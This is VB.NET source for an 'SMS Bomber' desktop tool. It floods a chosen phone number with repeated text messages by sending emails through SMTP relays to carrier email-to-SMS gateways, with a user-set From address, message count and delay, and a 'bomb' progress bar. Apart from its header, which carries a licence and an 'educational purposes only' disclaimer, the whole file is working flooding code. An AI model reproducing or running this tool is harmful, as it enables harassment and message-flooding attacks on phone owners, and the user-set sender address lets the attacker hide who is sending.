' SMS Bomber v1.0 Is a tool to send a number of texts with payload to a destined phone of your choosing with SMS gateways.
'
' LICENSING: Copyright (C) 2013 DENNIS CHOW dchow[AT]xtecsystems.com. Permission is granted to copy, distribute and/or modify this 
' document under the terms of the GNU Free Documentation License, Version 3 or any later version published by the 
' Free Software Foundation; with no Invariant Sections, no Front-Cover Texts, and no Back-Cover Texts. 
' A copy of the license is included in the section entitled "GNU Free Documentation License". at http://www.gnu.org/licenses/gpl.html
'
' DISCLAIMER: The author takes no responsibility of how anyone else may use this software. 
' It is intended as a proof of concept for educational purposes ONLY.
' 

' Code and Info References: 
' http://www.techrepublic.com/blog/programming-and-development/let-users-pick-a-file-to-open-via-openfiledialog-in-vbnet/481
' http://stackoverflow.com/questions/9454559/vt-net-how-to-populate-a-combobox-with-a-text-file
' http://support.microsoft.com/kb/320320
' http://support.prolateral.com/index.php?/Knowledgebase/Article/View/190
' http://www.mulliner.org/security/sms/feed/injecting_sms_mulliner_miller.pdf
' https://www.usenix.org/legacy/event/woot09/tech/full_papers/mulliner.pdf
' http://www.blackhat.com/presentations/bh-usa-09/MILLER/BHUSA09-Miller-FuzzingPhone-PAPER.pdf
' http://www.developershome.com/sms/sendSmsByAtCommands.asp
' http://support.prolateral.com/index.php?/Knowledgebase/Article/View/190

'Import Classes
Imports System.Diagnostics.Process
Imports System.Net.Mail
Imports System.Net.NetworkCredential
Imports System.Threading.Thread

Public Class MainMenu
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
        Me.Close()
    End Sub

    Private Sub OpenFileSMSInput_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileSMSDialog.FileOk
        Dim SMSInputVar As System.IO.Stream
        'Reading file
        SMSInputVar = OpenFileSMSDialog.OpenFile()
        OpenSMSFileTextBox.Text = OpenFileSMSDialog.FileName.ToString()

        If Not (SMSInputVar Is Nothing) Then
            'Populate to dropdown menu
            SMSGatewaysComboBox.Items.Clear()
            SMSGatewaysComboBox.Items.AddRange(IO.File.ReadAllLines(OpenFileSMSDialog.FileName))
            SMSInputVar.Close()
            'MessageBox.Show("SMS Gateways imported.")
        End If

    End Sub

    Private Sub OpenFileButton_Click(sender As Object, e As EventArgs) Handles OpenFileButton.Click
        OpenFileSMSDialog.SupportMultiDottedExtensions = False
        OpenFileSMSDialog.ShowDialog()
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles OpenSMSFileTextBox.TextChanged
        OpenSMSFileTextBox.Text = OpenFileSMSDialog.FileName.ToString()
    End Sub

    Private Sub SMSGatewaysComboBox_SelectedIndexChanged(sender As Object, e As EventArgs) Handles SMSGatewaysComboBox.SelectedIndexChanged

    End Sub

    Private Sub MainMenu_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CarrierLabel.Links.Add(0, CarrierLabel.Text.Length, "https://www.carrierlookup.com/")
    End Sub

    Private Sub CarrierLabel_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles CarrierLabel.LinkClicked
        Dim CarrierLookupSite As New ProcessStartInfo(e.Link.LinkData.ToString())
        Process.Start(CarrierLookupSite)
    End Sub

    Private Sub SendSMSButton_Click(sender As Object, e As EventArgs) Handles SendFromSMTPButton.Click
        'Local variables
        Dim FromUserInput As String = FromTextBox.Text
        Dim ToTargetUserInput As String = TargetTextBox.Text
        Dim ToDomainUserInput As String = SMSGatewaysComboBox.SelectedItem
        Dim ToEmailUserInput As String = (ToTargetUserInput + "@" + ToDomainUserInput)
        Dim SubjectUserInput As String = SubjectTextBox.Text
        Dim BodyUserInput As String = PayloadTextBox.Text
        Dim SMTPUserInput As String = SMTPRelaysComboBox.SelectedItem
        Dim SMTPLoginUserInput As String = SMTPLoginTextBox.Text
        Dim SMTPPassUserInput As String = SMTPPasswordMaskedTextBox.Text
        Dim SMTPPortUserInput As String = SMTPPortNumericUpDown.Value
        Dim TimeOutUserInput As String = TimeOutNumericUpDown.Text
        Dim ThresholdUserInput As Integer = ThresholdNumericUpDown.Text
        Dim QTYUserInput As Integer = QTYNumericUpDown.Text
        Dim QTYCounter As UInteger = 0


        Do While QTYCounter < QTYUserInput
            ' Create the Mail Message
            Using TextMessage As New MailMessage

                ' Set the address information
                TextMessage.From = New MailAddress(FromUserInput)
                TextMessage.To.Add(ToEmailUserInput)

                ' Set the content of the email
                TextMessage.Subject = SubjectUserInput
                TextMessage.Body = BodyUserInput

                ' Send the message
                Using SMTP As New SmtpClient(SMTPUserInput)
                    SMTP.EnableSsl = SSLCheckBox.CheckState
                    SMTP.Timeout = TimeOutUserInput
                    SMTP.Credentials = New System.Net.NetworkCredential(SMTPLoginUserInput, SMTPPassUserInput)
                    SMTP.Port = SMTPPortUserInput
                    SMTP.Send(TextMessage)
                End Using
            End Using
            QTYCounter = (QTYCounter + 1)

            'Threshold for x number of seconds
            System.Threading.Thread.Sleep((ThresholdUserInput * 1000))

            'Progress Bar

            Dim ProgressPercent As Integer = (QTYCounter / QTYUserInput)
            BombProgressBar.Increment(ProgressPercent)

        Loop

    End Sub

    Private Sub OpenFileSMTPButton_Click(sender As Object, e As EventArgs) Handles OpenFileSMTPButton.Click
        OpenFileSMTPDialog.SupportMultiDottedExtensions = False
        OpenFileSMTPDialog.ShowDialog()
    End Sub

    Private Sub OpenFileSMTPTextbox_TextChanged(sender As Object, e As EventArgs) Handles OpenFileSMTPTextBox.TextChanged
        OpenFileSMTPTextBox.Text = OpenFileSMTPDialog.FileName.ToString()
    End Sub

    Private Sub OpenFileSMTPDialog_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileSMTPDialog.FileOk
        Dim SMTPInputVar As System.IO.Stream
        'Reading file
        SMTPInputVar = OpenFileSMTPDialog.OpenFile()
        OpenFileSMTPTextBox.Text = OpenFileSMTPDialog.FileName.ToString()

        If Not (SMTPInputVar Is Nothing) Then
            'Populate to dropdown menu
            SMTPRelaysComboBox.Items.Clear()
            SMTPRelaysComboBox.Items.AddRange(IO.File.ReadAllLines(OpenFileSMTPDialog.FileName))
            SMTPInputVar.Close()
            'MessageBox.Show("SMTP Relays imported.")
        End If
    End Sub

    Private Sub SMTPRelaysComboBox_SelectedIndexChanged(sender As Object, e As EventArgs) Handles SMTPRelaysComboBox.SelectedIndexChanged

    End Sub

    Private Sub ProgressBar1_Click(sender As Object, e As EventArgs) Handles BombProgressBar.Click
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FileMenu.Click

    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub GettingStartedMenu_Click(sender As Object, e As EventArgs) Handles GettingStartedMenu.Click
        GettingStarted.Show()
    End Sub

    Private Sub AboutMenu_Click(sender As Object, e As EventArgs) Handles AboutMenu.Click
        AboutBox.Show()
    End Sub

    Private Sub MenuStrip1_ItemClicked(sender As Object, e As ToolStripItemClickedEventArgs) Handles MenuStrip1.ItemClicked

    End Sub

    Private Sub AcceptableUseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AcceptableUseToolStripMenuItem.Click
        AcceptableUse.Show()
    End Sub
End Class